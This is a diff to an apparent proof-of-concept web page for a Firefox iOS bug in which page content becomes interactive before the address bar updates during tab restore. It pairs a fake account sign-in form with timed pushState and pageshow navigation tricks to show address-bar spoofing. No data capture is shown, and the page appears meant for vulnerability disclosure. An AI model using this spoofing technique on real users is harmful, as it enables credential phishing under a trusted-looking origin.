@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Firefox iOS Tab Restore UI Desync — Demo</title>
+<title>Firefox iOS Tab Restore UI Desync — PoC</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
@@ -105,11 +105,13 @@ input {
 
 <div id="panel">
   <div class="card">
-    <h2>Account Sign-In</h2>
-    <div class="sub">Session verification required</div>
+    <h2>Account Sign‑In</h2>
+    <div class="sub">
+      Session verification required to continue
+    </div>
 
     <label>Email</label>
-    <input type="email" placeholder="user@example.com">
+    <input id="email" type="email" placeholder="user@example.com">
 
     <label>Password</label>
     <input type="password" placeholder="••••••••">
@@ -118,7 +120,7 @@ input {
 
     <div class="notice">
       Demo only — no data is collected.<br>
-      This UI demonstrates browser UI desynchronization.
+      Demonstrates browser UI state desynchronization during tab restore.
     </div>
   </div>
 </div>
@@ -126,6 +128,12 @@ input {
 <script>
 const panel = document.getElementById('panel');
 const start = document.getElementById('start');
+
+/*
+  This PoC demonstrates a UI state desynchronization issue where
+  web content becomes interactive before the browser address bar
+  completes its navigation update during tab restore (BFCache).
+*/
 
 function demoOnly() {
   alert(
@@ -142,15 +150,25 @@ start.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
   document.body.style.overflow = 'hidden';
+
+  // Prove interactivity before navigation settles
+  setTimeout(() => {
+    document.getElementById('email').focus();
+  }, 50);
 };
 
-// Tab restore / BFCache timing trigger
+// Trigger only on tab restore / BFCache resume
 window.addEventListener('pageshow', (e) => {
-  if (e.persisted) {
-    setTimeout(() => {
-      location.href = 'https://google.com:9090';
-    }, 100);
-  }
+  if (!e.persisted) return;
+
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        // Navigation that updates address bar after interactivity
+        location.href = 'http://google.com:9090';
+      }, 100);
+    });
+  });
 });
 </script>
 
